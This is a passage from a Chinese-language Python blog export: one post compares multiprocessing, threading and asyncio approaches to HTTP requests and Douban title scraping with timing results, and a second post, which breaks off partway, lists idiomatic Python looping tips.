<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> time</span><br><span class="line">   <span class="keyword">import</span> multiprocessing</span><br><span class="line"> </span><br><span class="line">   start = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">(_)</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = requests.get(url).text</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       cpu_count = multiprocessing.cpu_count()    <span class="comment">#cpu数目</span></span><br><span class="line">       print(<span class="string">'Cpu count:'</span>,cpu_count)</span><br><span class="line">       pool = multiprocessing.Pool(cpu_count)</span><br><span class="line">       pool.map(Request,range(<span class="number">10</span>))</span><br><span class="line">       end = time.time()</span><br><span class="line">       print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line">   <span class="comment">#运行结果：</span></span><br><span class="line">   Cpu count: <span class="number">4</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">10.076906442642212</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多线程(以10次请求为例)：由于无法进行异步及GIL的存在，效率很低，上下文的切换导致开销，甚至时间比单线程更长一点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target = Request())</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.073291301727295</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="同时使用多进程和异步协程进行请求"><a href="#同时使用多进程和异步协程进行请求" class="headerlink" title="同时使用多进程和异步协程进行请求"></a>同时使用多进程和异步协程进行请求</h3><blockquote>
<p>异步协程和多进程对网络请求都有提升,将二者结合起来：Facebook 的 John Reese 介绍了 asyncio 和 multiprocessing 各自的特点，并开发了一个新的库，叫做 aiomultiprocess</p>
</blockquote>
<ol>
<li><p>安装aiomultiprocess  <code>pip3 install aiomultiprocess</code></p>
</li>
<li><p>改写请求网络的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> aiomultiprocess <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    urls = [url <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>)]</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> Pool() <span class="keyword">as</span> pool:</span><br><span class="line">        result = <span class="keyword">await</span> pool.map(get, urls)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">coroutine = request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>, end - start)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="骚思路学习"><a href="#骚思路学习" class="headerlink" title="骚思路学习"></a>骚思路学习</h3><h4 id="requests实现异步爬虫一"><a href="#requests实现异步爬虫一" class="headerlink" title="requests实现异步爬虫一"></a>requests实现异步爬虫一</h4><blockquote>
<p>如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。</p>
</blockquote>
<ul>
<li><p>解决方案：这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。</p>
</li>
<li><p>run_in_executor方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AbstractEventLoop.run_in_executor(executor, func, *args)</span><br><span class="line">executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。</span><br><span class="line">func 就是要执行的函数</span><br><span class="line">args 就是传递给 func 的参数</span><br></pre></td></tr></table></figure>
</li>
<li><p>实例（使用time.sleep()）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"start "</span>,url)</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">await</span> loop.run_in_executor(<span class="keyword">None</span>,time.sleep,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    print(<span class="string">"stop "</span>,url)</span><br><span class="line">url_list = [<span class="string">"https://thief.one"</span>,<span class="string">"https://home.nmask.cn"</span>,<span class="string">"https://movie.nmask.cn"</span>,<span class="string">"https://tool.nmask.cn"</span>]</span><br><span class="line">tasks = [asyncio.ensure_future(run(url)) <span class="keyword">for</span> url <span class="keyword">in</span> url_list]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">start  https://thief.one</span><br><span class="line">start  https://home.nmask.cn</span><br><span class="line">start  https://movie.nmask.cn</span><br><span class="line">start  https://tool.nmask.cn</span><br><span class="line">stop  https://home.nmask.cn</span><br><span class="line">stop  https://thief.one</span><br><span class="line">stop  https://tool.nmask.cn</span><br><span class="line">stop  https://movie.nmask.cn</span><br></pre></td></tr></table></figure>
</li>
<li><p>有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。</p>
</li>
</ul>
<h4 id="requests实现异步爬虫二"><a href="#requests实现异步爬虫二" class="headerlink" title="requests实现异步爬虫二"></a>requests实现异步爬虫二</h4><blockquote>
<p>上面说了通过run_in_executor方法来添加线程的方式实现异步。在与之前学过的多线程、多进程相比，asyncio模块有一个非常大的不同：传入的函数不是随心所欲，所以这里以实现time.sleep的时的异步；以及修改函数为一个我们自己定义的函数。</p>
</blockquote>
<ol>
<li><p>实现time.sleep时的异步（run_in_executor开启了新的线程，再协调各个线程）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    futures = (</span><br><span class="line">        loop.run_in_executor(</span><br><span class="line">            <span class="keyword">None</span>,</span><br><span class="line">            myfun,</span><br><span class="line">            i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">start <span class="number">0</span>th</span><br><span class="line">start <span class="number">1</span>th</span><br><span class="line">start <span class="number">2</span>th</span><br><span class="line">start <span class="number">3</span>th</span><br><span class="line">start <span class="number">4</span>th</span><br><span class="line">start <span class="number">5</span>th</span><br><span class="line">start <span class="number">6</span>th</span><br><span class="line">start <span class="number">7</span>th</span><br><span class="line">start <span class="number">8</span>th</span><br><span class="line">start <span class="number">9</span>th</span><br><span class="line">finish <span class="number">0</span>th</span><br><span class="line">finish <span class="number">3</span>th</span><br><span class="line">finish <span class="number">2</span>th</span><br><span class="line">finish <span class="number">1</span>th</span><br><span class="line">finish <span class="number">5</span>th</span><br><span class="line">finish <span class="number">4</span>th</span><br><span class="line">finish <span class="number">6</span>th</span><br><span class="line">finish <span class="number">7</span>th</span><br><span class="line">finish <span class="number">8</span>th</span><br><span class="line">finish <span class="number">9</span>th</span><br><span class="line"><span class="number">1.008263111114502</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改开启的线程数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf <span class="comment"># 多加一个模块</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor: <span class="comment"># 设置10个线程</span></span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor, <span class="comment"># 按照10个线程来执行</span></span><br><span class="line">                myfun,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改函数为爬去豆瓣的电影标题(实际上没有出发异步)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(a)</span>:</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(a*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">fun_list = (get_title(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">loop.run_until_complete(asyncio.gather(*fun_list))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分结果）</span></span><br><span class="line">变脸</span><br><span class="line">卡萨布兰卡</span><br><span class="line">海盗电台</span><br><span class="line"><span class="number">8.284837245941162</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改用run_in_executor开启了新的线程触发异步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(i*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor,</span><br><span class="line">                get_title,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"></span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分）</span></span><br><span class="line">当幸福来敲门</span><br><span class="line">乱世佳人</span><br><span class="line">怦然心动</span><br><span class="line"><span class="number">0.8107953071594238</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过对比可以看出python中协程可以极大的提升I/O操作的效率，在上述爬去豆瓣的250个电影标题中效率提升了一个数量级。</p>
</li>
</ol>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><blockquote>
<p>第三方库uvloop可以对aiohttp加速，uvloop库基于libuv，也就是nodejs用的那个库。使用它也非常方便；有一个问题就是uvloop仅支持在Linux下的使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> asyncio</span><br><span class="line">&gt;<span class="keyword">import</span> uvloop</span><br><span class="line">&gt;asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>​    </p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本次通过学习python协程，对于python的高并发、异步编程做了较为全面的了解，同时对python的多线程、多进程、线程池、进程池等问题进行了回顾总结，提升编写工具的性能，目前来说满足了需求，通过本次学习，弥补了一些短板的地方。学习任重而道远！</p>
<h4 id="本次学习参考的资料链接如下："><a href="#本次学习参考的资料链接如下：" class="headerlink" title="本次学习参考的资料链接如下："></a>本次学习参考的资料链接如下：</h4><p>[]:<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000</a></p>
<p>[]:<a href="https://cuiqingcai.com/6160.html" target="_blank" rel="noopener">https://cuiqingcai.com/6160.html</a></p>
<p>[]:<a href="http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html" target="_blank" rel="noopener">http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title>python编程小技巧</title>
    <url>/2018/10/07/python%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h2 id="python编程技巧总结："><a href="#python编程技巧总结：" class="headerlink" title="python编程技巧总结："></a>python编程技巧总结：</h2><blockquote>
<p>在python的编程中会使用各种各样的语法，通过一些小技巧可以优化python代码，学习总结如下。学习参考地址：<a href="https://github.com/JeffPaine/beautiful_idiomatic_python" target="_blank" rel="noopener">https://github.com/JeffPaine/beautiful_idiomatic_python</a></p>
</blockquote>
<h3 id="遍历一个序列"><a href="#遍历一个序列" class="headerlink" title="遍历一个序列"></a>遍历一个序列</h3><ol>
<li><p>python2:(xrange在遍历范围内创建一个迭代器，一次生成一个值，效率比range更高)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]:</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#better:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>python:(xrange更名为range，进行了优化)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yello'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(color)):</span><br><span class="line">    print(color[i])</span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> color:</span><br><span class="line">    print(co)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="遍历倒序"><a href="#遍历倒序" class="headerlink" title="遍历倒序"></a>遍历倒序</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yello'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(color)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    print(color[i])</span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> reversed(color):</span><br><span class="line">    print(co)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="建立序列索引"><a href="#建立序列索引" class="headerlink" title="建立序列索引"></a>建立序列索引</h3><ul>
<li><p>python3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(colors)):</span><br><span class="line">    <span class="keyword">print</span> (i, <span class="string">'---&gt;'</span>, colors[i])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> i, color <span class="keyword">in</span> enumerate(colors):</span><br><span class="line">    <span class="keyword">print</span> (i, <span class="string">'---&gt;'</span>, color)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历两个序列"><a href="#遍历两个序列" class="headerlink" title="遍历两个序列"></a>遍历两个序列</h3><ol>
<li><p>python2:(用izip返回迭代)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">n = min(len(names), len(colors))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    <span class="keyword">print</span> names[i], <span class="string">'---&gt;'</span>, colors[i]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> zip(names, colors):</span><br><span class="line">    <span class="keyword">print</span> name, <span class="string">'---&gt;'</span>, color</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> izip(names, colors):</span><br><span class="line">    <span class="keyword">print</span> name, <span class="string">'---&gt;'</span>, color</span><br></pre></td></tr></table></figure>
</li>
